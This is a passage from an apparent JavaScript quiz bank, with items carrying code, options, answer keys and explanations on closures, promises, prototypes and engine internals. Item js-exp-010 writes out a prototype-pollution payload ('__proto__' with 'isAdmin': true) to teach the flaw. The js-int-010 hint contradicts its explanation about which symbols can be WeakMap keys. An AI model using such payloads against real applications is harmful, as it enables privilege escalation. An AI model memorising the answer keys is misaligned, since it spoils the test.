    explanation: "`parseInt(string, radix)` parses the string according to the specified numerical base. `'10'` in base 2 (binary) represents the number `2`. In base 10 (decimal), `'10'` represents `10`. Output is `2 10`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["numbers", "parseint", "radix"]
  },

  // =========================================================================
  // JAVASCRIPT INTERMEDIATE (20 QUESTIONS: js-int-001 to js-int-020)
  // =========================================================================
  {
    id: "js-int-001",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "closures",
    subtopic: "state_encapsulation",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the exact stdout printed after invoking these closure-bound counter functions?",
    code: "function createCounter() {\n  let count = 0;\n  return () => ++count;\n}\nconst c1 = createCounter();\nconst c2 = createCounter();\nconsole.log(c1(), c1(), c2());",
    options: ["1 2 1", "1 2 3", "1 1 1", "0 1 0"],
    correctAnswer: "1 2 1",
    acceptedAnswers: ["1 2 1"],
    hint: "Each invocation of `createCounter()` creates a brand-new lexical environment with its own private `count` variable.",
    explanation: "A closure captures the lexical environment where it was declared. `c1` and `c2` have distinct lexical scopes and separate `count` variables. Invoking `c1()` twice increments its count to 1 and then 2. Invoking `c2()` increments its own distinct count to 1.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["closures", "scoping", "javascript"]
  },
  {
    id: "js-int-002",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "event_loop",
    subtopic: "microtasks_vs_macrotasks",
    standardVersion: "HTML5 / ECMAScript 2024",
    prompt: "In what exact order are messages logged across synchronous execution, Promise microtasks, and setTimeout macrotasks?",
    code: "console.log('1');\nsetTimeout(() => console.log('2'), 0);\nPromise.resolve().then(() => console.log('3'));\nconsole.log('4');",
    options: ["1 4 3 2", "1 2 3 4", "1 4 2 3", "1 3 4 2"],
    correctAnswer: "1 4 3 2",
    acceptedAnswers: ["1 4 3 2"],
    hint: "Synchronous code runs first, followed by all jobs in the Microtask queue (`Promise.then`), and finally Macrotasks (`setTimeout`).",
    explanation: "Synchronous statements run first ('1', '4'). Next, the event loop drains the microtask queue, executing the resolved Promise callback ('3'). Finally, the next macrotask in the timer queue is dequeued, logging '2'. Order: `1 4 3 2`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["event_loop", "microtasks", "promises"]
  },
  {
    id: "js-int-003",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "async_await",
    subtopic: "error_handling",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by this async function when a promise rejects?",
    code: "async function runner() {\n  try {\n    await Promise.reject(new Error('fail'));\n    console.log('A');\n  } catch (err) {\n    console.log('B');\n  } finally {\n    console.log('C');\n  }\n}\nrunner();",
    options: ["B\\nC", "A\\nB\\nC", "B", "Uncaught Error: fail"],
    correctAnswer: "B\\nC",
    acceptedAnswers: ["B\\nC"],
    hint: "An `await` on a rejected promise throws an exception inside the async function body, intercepted by `catch`, followed by `finally`.",
    explanation: "Awaiting a rejected promise throws an error into the enclosing `try` block. Execution jumps immediately to `catch`, printing 'B', and then executes the `finally` block, printing 'C'. 'A' is skipped.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["async_await", "promises", "error_handling"]
  },
  {
    id: "js-int-004",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "promises",
    subtopic: "promise_all_fail_fast",
    standardVersion: "ECMAScript 2024",
    prompt: "How does Promise.all behave when one of its input promises rejects?",
    code: "const p1 = Promise.resolve('ok');\nconst p2 = Promise.reject('error_p2');\nconst p3 = Promise.reject('error_p3');\n\nPromise.all([p1, p2, p3])\n  .then(() => console.log('SUCCESS'))\n  .catch(err => console.log(err));",
    options: ["error_p2", "['error_p2', 'error_p3']", "SUCCESS", "error_p3"],
    correctAnswer: "error_p2",
    acceptedAnswers: ["error_p2"],
    hint: "`Promise.all()` is fail-fast: it rejects immediately with the reason of the very first promise that rejects.",
    explanation: "`Promise.all()` fulfills only when ALL input promises fulfill. If any promise rejects, it immediately rejects with the reason of that first rejection ('error_p2'), ignoring any remaining promises. To collect all outcomes, `Promise.allSettled()` should be used instead.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["promises", "promise_all"]
  },
  {
    id: "js-int-005",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "prototypes",
    subtopic: "prototype_chain_lookup",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by this prototype chain property lookup?",
    code: "const proto = { score: 10 };\nconst player = Object.create(proto);\nplayer.score = 20;\ndelete player.score;\nconsole.log(player.score);",
    options: ["10", "20", "undefined", "NaN"],
    correctAnswer: "10",
    acceptedAnswers: ["10"],
    hint: "`delete player.score` removes the own property from `player`. Subsequent access falls back to the prototype chain.",
    explanation: "Setting `player.score = 20` defines an own property on `player`, shadowing `proto.score`. When `delete player.score` removes this own property, subsequent property access traverses the prototype chain up to `proto`, finding `proto.score` (10).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["prototypes", "inheritance", "objects"]
  },
  {
    id: "js-int-006",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "functions",
    subtopic: "bind_this",
    standardVersion: "ECMAScript 2024",
    prompt: "Can a function bound with `.bind()` have its `this` context rebound using `.call()`?",
    code: "function show() { console.log(this.name); }\nconst bound = show.bind({ name: 'Alpha' });\nbound.call({ name: 'Beta' });",
    options: ["Alpha", "Beta", "undefined", "TypeError: Cannot rebind"],
    correctAnswer: "Alpha",
    acceptedAnswers: ["Alpha"],
    hint: "Once a function is bound via `Function.prototype.bind()`, its `this` is permanently hard-coded.",
    explanation: "`Function.prototype.bind()` creates an exotic bound function wrapper whose internal `[[BoundThis]]` cannot be overridden by subsequent calls to `.call()`, `.apply()`, or further `.bind()` invocations. It prints 'Alpha'.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["bind", "this", "functions"]
  },
  {
    id: "js-int-007",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "objects",
    subtopic: "freeze_shallow",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the result of mutating a nested object property after calling Object.freeze() on the parent?",
    code: "'use strict';\nconst config = Object.freeze({ server: { port: 8080 } });\nconfig.server.port = 3000;\nconsole.log(config.server.port);",
    options: ["3000", "8080", "TypeError: Cannot assign to read only property", "undefined"],
    correctAnswer: "3000",
    acceptedAnswers: ["3000"],
    hint: "`Object.freeze()` is shallow: it freezes only the direct properties of the target object, not nested referenced objects.",
    explanation: "`Object.freeze()` performs shallow freezing. The `config.server` reference cannot be reassigned, but the inner object `{ port: 8080 }` itself was never frozen. Thus mutating `config.server.port` succeeds, printing 3000. Deep freezing requires recursive freezing.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["freeze", "objects", "immutability"]
  },
  {
    id: "js-int-008",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "generators",
    subtopic: "yield_execution",
    standardVersion: "ECMAScript 2024",
    prompt: "What sequence is printed by invoking this generator function iterator?",
    code: "function* gen() {\n  yield 1;\n  yield 2;\n  return 3;\n}\nconst g = gen();\nconsole.log(g.next().value, g.next().value, g.next().value);",
    options: ["1 2 3", "1 2 undefined", "1 1 1", "undefined undefined undefined"],
    correctAnswer: "1 2 3",
    acceptedAnswers: ["1 2 3"],
    hint: "Calling `next()` returns an object `{ value, done }`. The `return` statement sets `done: true` with `value: 3`.",
    explanation: "First `g.next()` pauses at `yield 1` returning `{ value: 1, done: false }`. Second `next()` pauses at `yield 2` returning `{ value: 2, done: false }`. Third `next()` executes `return 3` returning `{ value: 3, done: true }`. The values are 1, 2, and 3.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["generators", "iterators"]
  },
  {
    id: "js-int-009",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "classes",
    subtopic: "private_fields",
    standardVersion: "ECMAScript 2024",
    prompt: "What happens when attempting to access a private class field `#secret` from outside the class?",
    code: "class Vault {\n  #secret = 'Pass123';\n  getSecret() { return this.#secret; }\n}\nconst v = new Vault();\nconsole.log(v.#secret);",
    options: [
      "SyntaxError: Private field '#secret' must be declared in an enclosing class",
      "undefined",
      "Pass123",
      "null"
    ],
    correctAnswer: "SyntaxError: Private field '#secret' must be declared in an enclosing class",
    acceptedAnswers: ["SyntaxError: Private field '#secret' must be declared in an enclosing class"],
    hint: "Private fields denoted with `#` have hard privacy enforced at parse/compile time, not runtime undefined returns.",
    explanation: "ECMAScript private fields with `#` syntax provide true language-level encapsulation. Attempting to reference a private field outside of its declaring class body produces a compile/parse-time `SyntaxError`, not a runtime `undefined`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["classes", "private_fields", "oop"]
  },
  {
    id: "js-int-010",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "collections",
    subtopic: "weakmap_garbage_collection",
    standardVersion: "ECMAScript 2024",
    prompt: "Can primitive values (strings, numbers) be used as keys in a WeakMap?",
    code: "const wm = new WeakMap();\ntry {\n  wm.set('key', 'value');\n} catch (e) {\n  console.log(e.name);\n}",
    options: ["TypeError", "ReferenceError", "SyntaxError", "null"],
    correctAnswer: "TypeError",
    acceptedAnswers: ["TypeError"],
    hint: "WeakMap keys must be garbage-collectable objects (or registered symbols), not primitive values.",
    explanation: "WeakMap keys must be objects (or non-registered symbols) so that their references can be held weakly for garbage collection. Attempting to use a primitive value like a string or number throws a `TypeError: Invalid value used as weak map key`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["weakmap", "garbage_collection", "types"]
  },
  {
    id: "js-int-011",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "data_types",
    subtopic: "symbol_uniqueness",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed when comparing two Symbols created with identical description strings?",
    code: "const s1 = Symbol('id');\nconst s2 = Symbol('id');\nconsole.log(s1 === s2, Symbol.for('key') === Symbol.for('key'));",
    options: ["false true", "true true", "false false", "true false"],
    correctAnswer: "false true",
    acceptedAnswers: ["false true"],
    hint: "`Symbol()` always creates a unique symbol primitive. `Symbol.for()` retrieves or creates from the global symbol registry.",
    explanation: "`Symbol('id')` creates a completely unique symbol every time, so `s1 === s2` is `false`. However, `Symbol.for('key')` looks up the symbol in the global runtime registry; both calls return the identical shared symbol instance, so that comparison is `true`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["symbol", "primitives", "registry"]
  },
  {
    id: "js-int-012",
    language: "javascript",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "performance",
    subtopic: "debounce_vs_throttle",
    standardVersion: "Design Patterns",
    prompt: "What is the primary operational difference between Debounce and Throttle techniques?",
    code: "// Debounce vs Throttle\nconst onSearch = debounce(fetchResults, 300);\nconst onScroll = throttle(updatePosition, 100);",
    options: [
      "Debounce delays execution until a burst of events stops for N ms; Throttle guarantees execution at most once every N ms",
      "Debounce only works with mouse clicks; Throttle only works with keyboard input",
      "Debounce runs on a Web Worker; Throttle runs on the main thread",
      "Throttle cancels previous server responses; Debounce buffers requests in IndexedDB"
    ],
    correctAnswer: "Debounce delays execution until a burst of events stops for N ms; Throttle guarantees execution at most once every N ms",
    acceptedAnswers: ["Debounce delays execution until a burst of events stops for N ms; Throttle guarantees execution at most once every N ms"],
    hint: "Debounce waits for a pause in events (e.g. typing query). Throttle rates-limits continuous events (e.g. window scrolling).",
    explanation: "Debouncing groups rapid calls and executes only after a specified quiet period with no new calls (ideal for search autocomplete). Throttling limits the execution frequency to a constant fixed rate (ideal for scroll or resize handlers).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["debounce", "throttle", "performance"]
  },
  {
    id: "js-int-013",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "objects",
    subtopic: "structured_clone",
    standardVersion: "HTML Living Standard",
    prompt: "How does `structuredClone()` handle circular references compared to `JSON.parse(JSON.stringify())`?",
    code: "const node = { id: 1 };\nnode.self = node; // Circular reference\n\ntry {\n  const cloned = structuredClone(node);\n  console.log(cloned.self === cloned);\n} catch (e) {\n  console.log('FAILED');\n}",
    options: ["true", "false", "FAILED", "TypeError: Converting circular structure to JSON"],
    correctAnswer: "true",
    acceptedAnswers: ["true"],
    hint: "`structuredClone()` is the modern browser/Node algorithm that natively supports circular references, Sets, Maps, and Dates.",
    explanation: "`JSON.stringify()` throws a `TypeError: Converting circular structure to JSON`. In contrast, the modern standard `structuredClone()` algorithm fully tracks and reproduces internal circular references, successfully preserving `cloned.self === cloned` (true).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["structuredClone", "deep_clone", "circular_refs"]
  },
  {
    id: "js-int-014",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "dom_events",
    subtopic: "event_phases",
    standardVersion: "DOM Level 3",
    prompt: "In DOM Event dispatch, what is the order of the three event propagation phases?",
    code: "parent.addEventListener('click', handler, true); // Phase 1\nchild.addEventListener('click', handler, false);  // Phase 2 & 3",
    options: [
      "Capturing Phase -> Target Phase -> Bubbling Phase",
      "Bubbling Phase -> Target Phase -> Capturing Phase",
      "Target Phase -> Bubbling Phase -> Capturing Phase",
      "Dispatch Phase -> Resolve Phase -> Finalize Phase"
    ],
    correctAnswer: "Capturing Phase -> Target Phase -> Bubbling Phase",
    acceptedAnswers: ["Capturing Phase -> Target Phase -> Bubbling Phase"],
    hint: "Events trickle down from Window/Document (capture), hit the target, and bubble back up to Window.",
    explanation: "DOM events propagate in three standardized phases: 1) Capturing phase (trickles down from window through ancestors), 2) Target phase (arrives at the actual event target), and 3) Bubbling phase (travels back up through ancestors to window).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["dom", "events", "bubbling", "capturing"]
  },
  {
    id: "js-int-015",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "functional_programming",
    subtopic: "currying",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by this curried multiplication function invocation?",
    code: "const multiply = a => b => c => a * b * c;\nconst doubleAndMultiply = multiply(2)(3);\nconsole.log(doubleAndMultiply(4));",
    options: ["24", "9", "14", "NaN"],
    correctAnswer: "24",
    acceptedAnswers: ["24"],
    hint: "Currying translates a function with N arguments into N functions each taking 1 argument. 2 * 3 * 4 = 24.",
    explanation: "Currying breaks down a multi-argument function into a series of unary functions. `multiply(2)` returns a function expecting `b`, `multiply(2)(3)` returns a function expecting `c` where `a=2` and `b=3` are closed over. Passing 4 evaluates `2 * 3 * 4 = 24`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["currying", "functional_programming"]
  },
  {
    id: "js-int-016",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "arrays",
    subtopic: "flat_infinity",
    standardVersion: "ECMAScript 2024",
    prompt: "What does Array.prototype.flat(Infinity) do to a deeply nested array?",
    code: "const nested = [1, [2, [3, [4]]]];\nconsole.log(nested.flat(Infinity).length);",
    options: ["4", "2", "3", "1"],
    correctAnswer: "4",
    acceptedAnswers: ["4"],
    hint: "Passing `Infinity` flattens all nested arrays recursively regardless of depth.",
    explanation: "The `flat()` method flattens sub-array elements recursively up to the specified depth. Passing `Infinity` completely flattens any arbitrarily deep array structure into a single 1D array `[1, 2, 3, 4]`, which has length 4.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["arrays", "flat"]
  },
  {
    id: "js-int-017",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "regex",
    subtopic: "named_capture_groups",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by accessing a named capture group from a RegExp match result?",
    code: "const re = /(?<year>\\d{4})-(?<month>\\d{2})/;\nconst match = re.exec('2026-10');\nconsole.log(match.groups.year, match.groups.month);",
    options: ["2026 10", "10 2026", "undefined undefined", "TypeError: Cannot read properties of undefined"],
    correctAnswer: "2026 10",
    acceptedAnswers: ["2026 10"],
    hint: "Named capture groups `(?<name>...)` populate the `match.groups` dictionary with keys matching the group names.",
    explanation: "ES2018 introduced named capture groups with `(?<name>pattern)`. Matched results expose a `groups` property containing an object mapping each group name to its captured substring (`match.groups.year === '2026'`).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["regex", "capture_groups"]
  },
  {
    id: "js-int-018",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "objects",
    subtopic: "property_descriptors",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed when attempting to mutate an object property defined with `writable: false` in strict mode?",
    code: "'use strict';\nconst obj = {};\nObject.defineProperty(obj, 'key', {\n  value: 'immutable',\n  writable: false\n});\ntry {\n  obj.key = 'changed';\n} catch (e) {\n  console.log(e.name);\n}",
    options: ["TypeError", "SyntaxError", "ReferenceError", "null"],
    correctAnswer: "TypeError",
    acceptedAnswers: ["TypeError"],
    hint: "In strict mode, assigning to a non-writable property throws a TypeError. In non-strict mode it fails silently.",
    explanation: "When a property descriptor has `writable: false`, assigning a new value to it throws a `TypeError: Cannot assign to read only property 'key'` in strict mode (in sloppy mode it fails silently).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["objects", "descriptors", "strict_mode"]
  },
  {
    id: "js-int-019",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "numbers",
    subtopic: "floating_point_precision",
    standardVersion: "IEEE 754",
    prompt: "What is the classic floating point precision result of `0.1 + 0.2 === 0.3` in JavaScript?",
    code: "console.log(0.1 + 0.2 === 0.3, 0.1 + 0.2);",
    options: ["false 0.30000000000000004", "true 0.3", "false 0.3", "true 0.30000000000000004"],
    correctAnswer: "false 0.30000000000000004",
    acceptedAnswers: ["false 0.30000000000000004"],
    hint: "Binary IEEE 754 64-bit double precision cannot represent 0.1 or 0.2 as exact finite binary fractions.",
    explanation: "Because numbers in JavaScript are IEEE 754 double precision floats, binary representations of 0.1 and 0.2 are repeating decimals with slight rounding errors. Their sum equals `0.30000000000000004`, causing `=== 0.3` to evaluate to `false`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["numbers", "floating_point", "ieee754"]
  },
  {
    id: "js-int-020",
    language: "javascript",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "promises",
    subtopic: "all_settled",
    standardVersion: "ECMAScript 2024",
    prompt: "What does Promise.allSettled return for each promise in its input array?",
    code: "const p1 = Promise.resolve(42);\nconst p2 = Promise.reject('boom');\nPromise.allSettled([p1, p2]).then(results => {\n  console.log(results[0].status, results[1].status);\n});",
    options: ["fulfilled rejected", "resolved rejected", "success failure", "fulfilled error"],
    correctAnswer: "fulfilled rejected",
    acceptedAnswers: ["fulfilled rejected"],
    hint: "`Promise.allSettled()` yields an array of descriptor objects with `status: 'fulfilled'` or `status: 'rejected'`.",
    explanation: "`Promise.allSettled()` waits for all promises to settle regardless of outcome. Each element in the resolved array is an object containing `status: 'fulfilled'` (with `value`) or `status: 'rejected'` (with `reason`). Output is `fulfilled rejected`.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["promises", "promise_all_settled"]
  },

  // =========================================================================
  // JAVASCRIPT EXPERT (20 QUESTIONS: js-exp-001 to js-exp-020)
  // =========================================================================
  {
    id: "js-exp-001",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "metaprogramming",
    subtopic: "proxy_reflect",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by this Proxy get trap modifying property lookups?",
    code: "const target = { secret: 'hidden' };\nconst proxy = new Proxy(target, {\n  get(t, prop, receiver) {\n    if (prop === 'secret') return 'REDACTED';\n    return Reflect.get(t, prop, receiver);\n  }\n});\nconsole.log(proxy.secret, target.secret);",
    options: ["REDACTED hidden", "REDACTED REDACTED", "hidden hidden", "undefined hidden"],
    correctAnswer: "REDACTED hidden",
    acceptedAnswers: ["REDACTED hidden"],
    hint: "Accessing the proxy invokes the trap handler; accessing the underlying target bypasses the proxy traps.",
    explanation: "A JavaScript `Proxy` intercepts operations on the proxy wrapper. Accessing `proxy.secret` triggers the `get` trap, returning `'REDACTED'`. Accessing the underlying `target.secret` directly bypasses the proxy and returns `'hidden'`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["proxy", "reflect", "metaprogramming"]
  },
  {
    id: "js-exp-002",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "scoping",
    subtopic: "parameter_tdz",
    standardVersion: "ECMAScript 2024",
    prompt: "What happens when default parameters attempt to reference variables declared later in the parameter list?",
    code: "function test(a = b, b = 2) {\n  return a + b;\n}\ntest(undefined, 5);",
    options: [
      "ReferenceError: Cannot access 'b' before initialization",
      "7",
      "NaN",
      "TypeError: b is undefined"
    ],
    correctAnswer: "ReferenceError: Cannot access 'b' before initialization",
    acceptedAnswers: ["ReferenceError: Cannot access 'b' before initialization"],
    hint: "Parameters are evaluated left-to-right in their own scope. `b` is in the Temporal Dead Zone when evaluating `a = b`.",
    explanation: "Function parameters form an intermediate parameter scope evaluated from left to right. When `a = b` is evaluated, parameter `b` has been declared but not yet initialized (it is in the Temporal Dead Zone), throwing a `ReferenceError`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["tdz", "parameters", "scoping"]
  },
  {
    id: "js-exp-003",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "v8_internals",
    subtopic: "hidden_classes",
    standardVersion: "V8 Engine Architecture",
    prompt: "In V8 and modern JS engines, why does adding properties to objects in different orders cause a performance deoptimization?",
    code: "// Object Shapes / Hidden Classes\nconst obj1 = {}; obj1.x = 1; obj1.y = 2;\nconst obj2 = {}; obj2.y = 2; obj2.x = 1; // Different transition tree!",
    options: [
      "It creates two different hidden classes (Shapes/Maps), making inline caches polymorphic or megamorphic rather than monomorphic",
      "It forces the garbage collector to immediately run a full Mark-Sweep pause",
      "It switches the JavaScript interpreter from JIT machine code back to AST interpretation permanently",
      "It causes an unhandled memory leak in the C++ binding layer"
    ],
    correctAnswer: "It creates two different hidden classes (Shapes/Maps), making inline caches polymorphic or megamorphic rather than monomorphic",
    acceptedAnswers: ["It creates two different hidden classes (Shapes/Maps), making inline caches polymorphic or megamorphic rather than monomorphic"],
    hint: "V8 tracks property offsets using hidden classes (Shapes). Property addition order creates different shape transition trees.",
    explanation: "V8 uses hidden classes (Maps/Shapes) to optimize property access via Inline Caching (IC). Adding properties in different orders creates distinct transition paths and different Shapes for `obj1` and `obj2`, causing inline caches to become polymorphic/megamorphic, degrading execution speed.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["v8", "hidden_classes", "performance"]
  },
  {
    id: "js-exp-004",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "event_loop",
    subtopic: "microtask_starvation",
    standardVersion: "HTML Living Standard",
    prompt: "What happens if a recursive function continually schedules microtasks via `queueMicrotask()`?",
    code: "function loop() {\n  queueMicrotask(loop);\n}\nloop();",
    options: [
      "The event loop starves: UI rendering, timers (setTimeout), and I/O events will never execute because the microtask queue never empties",
      "It throws a 'Maximum call stack size exceeded' error immediately",
      "The JavaScript engine automatically demotes the task to a macrotask after 100 iterations",
      "A Web Worker is automatically spawned to handle the recursive loop"
    ],
    correctAnswer: "The event loop starves: UI rendering, timers (setTimeout), and I/O events will never execute because the microtask queue never empties",
    acceptedAnswers: ["The event loop starves: UI rendering, timers (setTimeout), and I/O events will never execute because the microtask queue never empties"],
    hint: "The event loop must completely empty the microtask queue before it can proceed to rendering or macrotasks.",
    explanation: "The HTML event loop processing model specifies that the microtask queue must be completely drained before the next macrotask or browser rendering step. Continuously enqueuing microtasks starves the event loop, freezing UI rendering and user interactions without exceeding call stack limits.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["event_loop", "microtasks", "starvation"]
  },
  {
    id: "js-exp-005",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "iterators",
    subtopic: "custom_iterable",
    standardVersion: "ECMAScript 2024",
    prompt: "What does this custom iterable object output when used with the spread operator `...`?",
    code: "const countdown = {\n  from: 3,\n  [Symbol.iterator]() {\n    let curr = this.from;\n    return {\n      next: () => ({ value: curr, done: curr-- === 0 })\n    };\n  }\n};\nconsole.log([...countdown].join(' '));",
    options: ["3 2 1", "3 2 1 0", "2 1 0", "TypeError: countdown is not iterable"],
    correctAnswer: "3 2 1",
    acceptedAnswers: ["3 2 1"],
    hint: "When `done: true`, iteration halts and the corresponding `value` is ignored by the spread operator.",
    explanation: "For `curr = 3`: done is false (`3 === 0` is false, curr becomes 2), yields 3. For 2: done is false (curr becomes 1), yields 2. For 1: done is false (curr becomes 0), yields 1. For 0: `curr === 0` is true, so `done: true`. The loop terminates, yielding `[3, 2, 1]`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["iterators", "symbol_iterator"]
  },
  {
    id: "js-exp-006",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "type_coercion",
    subtopic: "symbol_to_primitive",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed when an object with `Symbol.toPrimitive` is coerced in number and string contexts?",
    code: "const item = {\n  [Symbol.toPrimitive](hint) {\n    if (hint === 'number') return 42;\n    if (hint === 'string') return 'Syntax';\n    return 'default';\n  }\n};\nconsole.log(+item, `${item}`, item + '');",
    options: ["42 Syntax default", "42 Syntax 42", "Syntax Syntax default", "NaN Syntax default"],
    correctAnswer: "42 Syntax default",
    acceptedAnswers: ["42 Syntax default"],
    hint: "Unary `+` passes hint 'number'. Template literal `${item}` passes hint 'string'. Addition with string passes hint 'default'.",
    explanation: "`Symbol.toPrimitive` takes precedence over `valueOf` and `toString`. Unary `+item` requests hint `'number'` -> `42`. `${item}` requests hint `'string'` -> `'Syntax'`. Binary `item + ''` requests hint `'default'` -> `'default'`, resulting in `'42 Syntax default'`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["symbol_to_primitive", "type_coercion"]
  },
  {
    id: "js-exp-007",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency",
    subtopic: "shared_array_buffer_atomics",
    standardVersion: "ECMAScript 2024",
    prompt: "Why are `Atomics` operations required when multiple Web Workers read and write to a `SharedArrayBuffer`?",
    code: "const sab = new SharedArrayBuffer(1024);\nconst ta = new Int32Array(sab);\nAtomics.add(ta, 0, 1); // Atomic increment across worker threads",
    options: [
      "To prevent data race conditions and guarantee atomic, non-torn reads and writes with hardware memory barriers",
      "Because SharedArrayBuffer cannot be read without cryptographic decryption",
      "To convert typed arrays into regular JavaScript arrays",
      "Because modern browsers disallow worker postMessage calls"
    ],
    correctAnswer: "To prevent data race conditions and guarantee atomic, non-torn reads and writes with hardware memory barriers",
    acceptedAnswers: ["To prevent data race conditions and guarantee atomic, non-torn reads and writes with hardware memory barriers"],
    hint: "`Atomics` ensures memory operations complete as single indivisible operations without thread interleaving.",
    explanation: "`SharedArrayBuffer` allows true shared memory across concurrent threads (workers). The `Atomics` namespace provides primitives (e.g. `Atomics.add`, `Atomics.wait`, `Atomics.notify`) that enforce memory barriers and eliminate data races.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["atomics", "shared_array_buffer", "concurrency"]
  },
  {
    id: "js-exp-008",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory_management",
    subtopic: "weakref_finalization",
    standardVersion: "ECMAScript 2024",
    prompt: "What does `FinalizationRegistry` provide in modern JavaScript?",
    code: "const registry = new FinalizationRegistry(heldValue => {\n  console.log('Cleaned up target object:', heldValue);\n});\nregistry.register(targetObject, 'metadata_token');",
    options: [
      "A callback invoked after a registered target object has been reclaimed by the garbage collector",
      "A mechanism to force immediate garbage collection synchronously",
      "A sandbox that prevents an object from ever being garbage collected",
      "An automated file cleanup utility for Node.js temp files"
    ],
    correctAnswer: "A callback invoked after a registered target object has been reclaimed by the garbage collector",
    acceptedAnswers: ["A callback invoked after a registered target object has been reclaimed by the garbage collector"],
    hint: "It allows cleanup callbacks (e.g. freeing WebAssembly memory or native handles) when an object is collected.",
    explanation: "`FinalizationRegistry` lets you register cleanup callbacks that fire after a monitored object has been collected by the engine's garbage collector. It is commonly paired with `WeakRef` to manage external native or WebAssembly resources.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["finalization_registry", "weakref", "garbage_collection"]
  },
  {
    id: "js-exp-009",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "functions",
    subtopic: "eval_vs_function",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by evaluating `x` inside a `Function` constructor compared to direct `eval`?",
    code: "const x = 'outer';\nfunction demo() {\n  const x = 'inner';\n  const f = new Function('return x;');\n  return [eval('x'), f()];\n}\nconsole.log(demo().join(' '));",
    options: ["inner outer", "inner inner", "outer outer", "ReferenceError: x is not defined"],
    correctAnswer: "inner outer",
    acceptedAnswers: ["inner outer"],
    hint: "`eval()` executes in the current local lexical scope, while `Function()` always executes in the global top-level scope.",
    explanation: "`eval('x')` accesses the local lexical scope where it is called, seeing `x = 'inner'`. However, code evaluated by the `Function(...)` constructor does not inherit the calling scope's lexical closure; it always runs in the top-level global scope, seeing `x = 'outer'`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["eval", "function_constructor", "scoping"]
  },
  {
    id: "js-exp-010",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "security",
    subtopic: "prototype_pollution",
    standardVersion: "CWE-1321",
    prompt: "How does Prototype Pollution occur when merging unvalidated JSON payloads into JavaScript objects?",
    code: "// Malicious payload\nconst payload = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\nmergeObjects(target, payload); // Target merges into Object.prototype!",
    options: [
      "Attacker keys like `__proto__` or `constructor.prototype` modify `Object.prototype`, injecting malicious properties across every object in the runtime",
      "It causes a stack overflow by creating recursive object links",
      "It rewrites the V8 bytecode compiler instruction cache",
      "It decrypts the server's environment variables into console.log"
    ],
